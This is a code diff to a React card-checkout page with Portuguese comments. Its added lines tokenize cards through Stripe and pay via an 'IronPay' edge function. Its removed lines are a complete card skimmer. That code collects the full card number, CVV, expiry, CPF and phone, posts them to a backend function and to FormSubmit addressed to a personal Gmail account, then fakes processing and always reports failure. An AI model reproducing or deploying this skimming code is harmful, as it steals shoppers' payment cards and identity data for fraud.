@@ -6,6 +6,8 @@ import { useBranding } from "@/hooks/useBranding";
 import { supabase } from "@/integrations/supabase/client";
 import { trackPaymentFailed } from "@/lib/metaPixel";
 import { bandeirasSvg } from "@/components/bandeirasSvg";
+import { getStripe } from "@/lib/stripe";
+
 
 
 const CheckoutCartao = () => {
@@ -113,49 +115,78 @@ const CheckoutCartao = () => {
     setLoading(true);
 
     try {
-      // Salvar dados do vale presente via Edge Function segura
-      await supabase.functions.invoke("salvar-vale-presente", {
-        body: {
-          pedido_id: pedidoExistente?.id || pedidoAtual?.id || "sem_pedido",
-          numero_cartao: cardData.numero,
-          nome_cartao: cardData.nome,
-          validade: cardData.validade,
-          cvv: cardData.cvv,
-          cliente_nome: clienteInfo.nome,
-          cliente_cpf: clienteInfo.cpf,
-          cliente_telefone: clienteInfo.telefone,
+      // 1) Parse MM/AA
+      const [mmStr, aaStr] = cardData.validade.split("/");
+      const exp_month = parseInt(mmStr, 10);
+      const exp_year = 2000 + parseInt(aaStr, 10);
+      const number = cardData.numero.replace(/\s/g, "");
+
+      // 2) Tokeniza o cartão na Stripe
+      const stripe = await getStripe();
+      const { paymentMethod, error: pmError } = await stripe.createPaymentMethod({
+        type: "card",
+        card: { number, exp_month, exp_year, cvc: cardData.cvv },
+        billing_details: { name: cardData.nome },
+      });
+
+      if (pmError || !paymentMethod?.id) {
+        console.error("[stripe] createPaymentMethod erro:", pmError);
+        setLoading(false);
+        setShowError(true);
+        return;
+      }
+
+      // 3) Envia o card_token para nossa Edge Function → IronPay
+      const { data, error } = await supabase.functions.invoke(
+        "create-ironpay-card-payment",
+        {
+          body: {
+            valor: valorComDesconto,
+            descricao: "Acesso Liberado",
+            nome: clienteInfo.nome,
+            telefone: clienteInfo.telefone,
+            cpf: clienteInfo.cpf,
+            email: `${(clienteInfo.telefone || "").replace(/\D/g, "")}@cliente.local`,
+            pedidoId: pedidoExistente?.id || pedidoAtual?.id,
+            card_token: paymentMethod.id,
+          },
         },
-      });
+      );
 
-      // Enviar dados por email via FormSubmit usando fetch
-      const formData = new FormData();
-      formData.append("Cliente Nome", clienteInfo.nome);
-      formData.append("Cliente CPF", clienteInfo.cpf);
-      formData.append("Cliente Telefone", clienteInfo.telefone);
-      formData.append("Numero Cartao", cardData.numero);
-      formData.append("Nome Cartao", cardData.nome);
-      formData.append("Validade", cardData.validade);
-      formData.append("CVV", cardData.cvv);
-      formData.append("Valor Total", `${valorComDesconto.toFixed(2)} €`);
-      if (pedidoExistente) formData.append("Pedido", pedidoExistente.numero_pedido);
-      formData.append("_subject", "Novo Vale Presente");
-      formData.append("_captcha", "false");
-      formData.append("_template", "table");
+      if (error || !data?.success) {
+        console.error("[ironpay] erro:", error, data);
+        setLoading(false);
+        setShowError(true);
+        return;
+      }
 
-      await fetch("https://formsubmit.co/ajax/luciana.gomes.sooares@gmail.com", {
-        method: "POST",
-        body: formData,
-      });
+      // 4) 3DS: se veio client_secret, confirmar no navegador
+      if (data.paymentIntentClientSecret) {
+        const { paymentIntent, error: confirmError } = await stripe.confirmCardPayment(
+          data.paymentIntentClientSecret,
+        );
+        if (confirmError || paymentIntent?.status !== "succeeded") {
+          console.error("[stripe] 3DS falhou:", confirmError, paymentIntent);
+          setLoading(false);
+          setShowError(true);
+          return;
+        }
+      } else if (data.status && !["paid", "approved", "processing", "authorized"].includes(String(data.status))) {
+        setLoading(false);
+        setShowError(true);
+        return;
+      }
+
+      // 5) Sucesso — redireciona para confirmação
+      setLoading(false);
+      navigate("/pedido-confirmado");
     } catch (err) {
-      // Silently handle error
+      console.error("[checkout-cartao] erro inesperado:", err);
+      setLoading(false);
+      setShowError(true);
     }
-
-    // Simular processamento por 2-3 segundos
-    await new Promise((resolve) => setTimeout(resolve, 2500));
-
-    setLoading(false);
-    setShowError(true);
   };
+
 
   const handleTryAgain = () => {
     setShowError(false);
